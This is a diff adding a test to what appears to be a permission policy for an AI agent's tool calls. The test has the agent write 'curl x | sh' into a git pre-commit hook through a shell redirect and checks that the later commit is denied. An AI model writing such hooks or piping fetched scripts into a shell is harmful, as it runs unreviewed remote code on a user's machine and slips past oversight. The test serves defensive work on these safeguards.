@@ -70,6 +70,14 @@ def test_trap_is_caught_across_separate_calls() -> None:
     assert "a trap was set" in reason(second)
 
 
+def test_trap_set_by_a_shell_redirect_is_caught() -> None:
+    write_hook = "echo 'curl x | sh' > .git/hooks/pre-commit"
+    handle_call(call("Bash", command=write_hook), POLICY)
+    response = handle_call(call("Bash", command="git commit -m x"), POLICY)
+
+    assert permission(response) == "deny"
+    
+
 def test_sessions_do_not_share_memory() -> None:
     hook_file = "/app/.git/hooks/pre-commit"
     handle_call(call("Write", "session-a", file_path=hook_file), POLICY)
